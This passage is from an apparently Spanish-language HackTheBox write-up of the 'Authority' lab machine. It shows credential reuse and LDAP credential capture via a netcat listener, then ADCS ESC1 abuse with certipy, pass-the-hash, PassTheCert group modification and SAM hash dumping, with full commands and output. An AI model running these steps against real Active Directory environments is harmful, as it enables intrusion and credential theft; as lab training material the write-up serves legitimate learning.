    - ansible-vault
<span class="k">done</span><span class="o">!</span> ✨ 🌟 ✨
</code></pre></div></div>

<ul>
  <li>Y tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ansible-vault decrypt vault1
Vault password:
Decryption successful
❯ <span class="nb">ls</span>
❯ ansible-vault decrypt vault2
Vault password:
Decryption successful
❯ ansible-vault decrypt vault3
Vault password:
Decryption successful
❯ <span class="nb">cat </span>vault1
svc_pwm                                                                                 

❯ <span class="nb">cat </span>vault2
pWm_@dm!N_!23                                                                           

❯ <span class="nb">cat </span>vault3
DevT3st@123%            
</code></pre></div></div>

<ul>
  <li>Si verificamos vemos que la credencial es correcta para el usuario pero no podemos listar recursos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
❯ cme smb 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span> <span class="nt">--shares</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>-] Error enumerating shares: STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Sin embargo probando otros servicios tampoco nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme winrm 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
❯ cme ldap 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.10.11.222    445    AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23 Error connecting to the domain, are you sure LDAP service is running on the target ?
</code></pre></div></div>

<ul>
  <li>Si probamos las credenciales en el panel de login de <code class="language-plaintext highlighter-rouge">pwm</code> no nos deja entrar <a href="https://github.com/pwm-project/pwm">https://github.com/pwm-project/pwm</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/3.png" />
</p>

<ul>
  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">Configuration Editor</code> nos lleva aquí.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/4.png" />
</p>

<ul>
  <li>Si pegamos la contraseña que tenemos y le damos a <code class="language-plaintext highlighter-rouge">Sign in</code> nos deja entrar.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/5.png" />
</p>

<h2 id="shell-as-svc_ldap-and-user-flag">Shell as svc_ldap and user flag</h2>

<ul>
  <li>Vemos que esta el usuario <code class="language-plaintext highlighter-rouge">svc_ldap</code> y la contraseña esta guardada allí como en la parte de LDAP <code class="language-plaintext highlighter-rouge">URLs</code> nos deja agregar un <code class="language-plaintext highlighter-rouge">Value</code> podemos poner nuestra <code class="language-plaintext highlighter-rouge">ip</code> y ponernos en escucha en el puerto que opera LDAP por defecto que es el <code class="language-plaintext highlighter-rouge">389</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 389
listening on <span class="o">[</span>any] 389 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/6.png" />
</p>

<ul>
  <li>Después de la damos en <code class="language-plaintext highlighter-rouge">Save</code> y si nos vamos al <code class="language-plaintext highlighter-rouge">netcat</code> tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 389
listening on <span class="o">[</span>any] 389 ...
connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.222] 61273
0Y<span class="sb">`</span>T<span class="p">;</span><span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htblDaP_1n_th3_cle4r!
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>creds.txt
svc_ldap:lDaP_1n_th3_cle4r!
</code></pre></div></div>

<ul>
  <li>Son correctas y nos podemos conectar con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme winrm 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> lDaP_1n_th3_cle4r!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
802832b5ae3b3fb19108fd495fdb7232
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">.pfx</code> que es un archivo para almacenar certificados digitales y claves privadas de manera segura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir


    </span>Directory: C:<span class="se">\</span>


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        4/23/2023   6:16 PM                Certs
d-----        3/28/2023   1:59 PM                Department Shares
d-----        3/17/2023   9:20 AM                Development
d-----         8/9/2022   7:00 PM                inetpub
d-----        3/24/2023   8:22 PM                PerfLogs
d-r---        3/25/2023   1:20 AM                Program Files
d-----        3/25/2023   1:19 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
d-----        7/11/2024  12:24 AM                pwm
d-r---        3/24/2023  11:27 PM                Users
d-----        7/12/2023   1:19 PM                Windows
<span class="nt">-a----</span>        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>Certs
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\C</span>erts&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\C</span>erts


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        4/23/2023   6:11 PM           4933 LDAPs.pfx
</code></pre></div></div>

<ul>
  <li>Como en otras máquinas tendremos que trabajar con ADCS (Active Directory Certificate Services) <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a> podemos usar el .exe dentro de la máquina para identificar <code class="language-plaintext highlighter-rouge">templates</code> o hacerlo desde nuestra máquina de atacante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pipx <span class="nb">install </span>certipy-ad
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora buscamos por <code class="language-plaintext highlighter-rouge">templates</code> vulnerables.</p>
  </li>
  <li>
    <p>Tenemos que agregar ese subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy find <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-target</span> authority.htb <span class="nt">-text</span> <span class="nt">-stdout</span> <span class="nt">-vulnerable</span>
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 37 certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 13 enabled certificate templates
<span class="o">[!]</span> Failed to resolve: authority.authority.htb
</code></pre></div></div>

<ul>
  <li>Ahora ya funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy find <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-target</span> authority.htb <span class="nt">-text</span> <span class="nt">-stdout</span> <span class="nt">-vulnerable</span>
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 37 certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 13 enabled certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via CSRA
<span class="o">[!]</span> Got error <span class="k">while </span>trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via RRP
<span class="o">[!]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>AUTHORITY-CA, <span class="nv">DC</span><span class="o">=</span>authority, <span class="nv">DC</span><span class="o">=</span>htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption <span class="k">for </span>Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB<span class="se">\A</span>dministrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB<span class="se">\A</span>dministrators
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
        ManageCa                        : AUTHORITY.HTB<span class="se">\A</span>dministrators
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
        Enroll                          : AUTHORITY.HTB<span class="se">\A</span>uthenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB<span class="se">\D</span>omain Computers
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Owner Principals          : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Dacl Principals           : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Property Principals       : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
    <span class="o">[!]</span> Vulnerabilities
      ESC1                              : <span class="s1">'AUTHORITY.HTB\\Domain Computers'</span> can enroll, enrollee supplies subject and template allows client authentication
</code></pre></div></div>

<ul>
  <li>
    <p>Y bueno nos reporta ESC1 en CorpVPN <a href="https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8">https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8</a> antes de explotar eso necesitamos agregar un computer account.</p>
  </li>
  <li>
    <p>Si verificamos cuantas cuentas de equipo puede crear un usuario normal sin privilegios administrativos vemos que 10 así que no tendremos problemas.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme ldap 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-M</span> MAQ
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAPS       10.10.11.222    636    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.10.11.222    389    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
</code></pre></div></div>

<ul>
  <li>Vamos agregar la computadora.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-addcomputer <span class="s1">'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'</span> <span class="nt">-method</span> LDAPS <span class="nt">-computer-name</span> <span class="s1">'miguel'</span> <span class="nt">-computer-pass</span> <span class="s1">'miguel123'</span> <span class="nt">-dc-ip</span> 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added machine account miguel<span class="nv">$ </span>with password miguel123.
</code></pre></div></div>

<ul>
  <li>Sincronizamos nuestro reloj con el del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>ntpdate 10.10.11.222
</code></pre></div></div>

<ul>
  <li>Ahora vamos a obtener el certificado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy req <span class="nt">-username</span> <span class="s1">'miguel$'</span> <span class="nt">-password</span> miguel123 <span class="nt">-ca</span> AUTHORITY-CA <span class="nt">-dc-ip</span> 10.10.11.222 <span class="nt">-template</span> CorpVPN <span class="nt">-upn</span> administrator@authority.htb <span class="nt">-dns</span> authority.htb
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 4
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with multiple identifications
    UPN: <span class="s1">'administrator@authority.htb'</span>
    DNS Host Name: <span class="s1">'authority.htb'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved certificate and private key to <span class="s1">'administrator_authority.pfx'</span>
</code></pre></div></div>

<ul>
  <li>Ahora solicitamos el <code class="language-plaintext highlighter-rouge">hash</code> del administrador.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy auth <span class="nt">-pfx</span> administrator_authority.pfx
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found multiple identifications <span class="k">in </span>certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Please <span class="k">select </span>one:
    <span class="o">[</span>0] UPN: <span class="s1">'administrator@authority.htb'</span>
    <span class="o">[</span>1] DNS Host Name: <span class="s1">'authority.htb'</span>
<span class="o">&gt;</span> 0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: administrator@authority.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'administrator.ccache'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@authority.htb'</span>: aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
</code></pre></div></div>

<ul>
  <li>Son credenciales validas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme winrm 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'6961f422924da90a6928197429eea4ed'</span>
SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\a</span>dministrator:6961f422924da90a6928197429eea4ed <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'6961f422924da90a6928197429eea4ed'</span>
                                   
Evil-WinRM shell v3.5
                                   
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
                                   
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                   
Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
6f14e5def2f1681729325fa02fcbefb5
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>En caso de que no pudieras solicitar el hash puedes emplear este ataque <a href="https://github.com/AlmondOffSec/PassTheCert">https://github.com/AlmondOffSec/PassTheCert</a>.</p>
  </li>
  <li>
    <p>Para esto necesitamos la <code class="language-plaintext highlighter-rouge">key</code> y un certificado.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy cert <span class="nt">-pfx</span> administrator_authority.pfx <span class="nt">-nocert</span> <span class="nt">-out</span> administrator.key
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing private key to <span class="s1">'administrator.key'</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy cert <span class="nt">-pfx</span> administrator_authority.pfx <span class="nt">-nokey</span> <span class="nt">-out</span> administrator.crt
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing certificate and  to <span class="s1">'administrator.crt'</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora usamos la herramienta.</p>
  </li>
  <li>
    <p>Lo que estamos haciendo es añadiendo al usuario svc_ldap al grupo Administrators.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 /opt/PassTheCert/Python/passthecert.py <span class="nt">-action</span> ldap-shell <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands

<span class="c"># help</span>

 add_computer computer <span class="o">[</span>password] <span class="o">[</span>nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user <span class="o">[</span>parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user <span class="o">[</span>password] - Attempt to change a given user<span class="s1">'s password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user'</span>s account.
 enable_account user - Enable the user<span class="s1">'s account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don'</span>t require pre-authentication flag to <span class="nb">true </span>or false.
 set_rbcd target grantee - Grant the grantee <span class="o">(</span>sAMAccountName<span class="o">)</span> the ability to perform RBCD to the target <span class="o">(</span>sAMAccountName<span class="o">)</span><span class="nb">.</span>
 start_tls - Send a StartTLS <span class="nb">command </span>to upgrade from LDAP to LDAPS. Use this to bypass channel binding <span class="k">for </span>operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo <span class="k">for </span>the given user. The gpoSID must be entered surrounding by <span class="o">{}</span><span class="nb">.</span>
 <span class="nb">exit</span> - Terminates this session.

<span class="c"># add_user_to_group svc_ldap administrators</span>
Adding user: svc_ldap to group Administrators result: OK
</code></pre></div></div>

<ul>
  <li>Ahora podemos dumpear los hashes como el del administrador para conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">--sam</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] Dumping SAM hashes
SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:a15217bb5af3046c87b5bb6afa7b193e:::
SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.222    445    AUTHORITY        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ERROR:root:SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
SMB         10.10.11.222    445    AUTHORITY        [+] Added 3 SAM hashes to the database
</span></code></pre></div></div>

<ul>
  <li>
    <p>El hash que nos da <code class="language-plaintext highlighter-rouge">crackmapexec</code> no es correcto por que al poner <code class="language-plaintext highlighter-rouge">--sam</code> el hash es el local y no el del AD.</p>
  </li>
  <li>
    <p>Para tener los hashes del AD y tener el correcto del administrador debemos usar <code class="language-plaintext highlighter-rouge">--ntds drsuapi</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">--ntds</span> drsuapi
